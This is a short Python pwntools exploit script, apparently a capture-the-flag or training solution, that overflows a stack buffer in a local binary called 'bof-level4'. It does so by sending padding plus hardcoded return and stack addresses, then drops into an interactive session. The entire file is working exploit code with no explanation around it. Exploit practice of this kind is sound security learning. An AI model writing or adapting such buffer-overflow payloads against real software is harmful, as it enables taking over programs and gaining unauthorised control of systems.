#!/usr/bin/env python

from pwn import *

p = process("./bof-level4")

p.recv()

p.send("X" * 20 + "ABCDEFGH" + "XXXX" + p32(0xffffd568) + p32(0x0804876b) + "XXXXXXXXXXXX" + p32(0x08048530) +  "\n")

p.interactive()
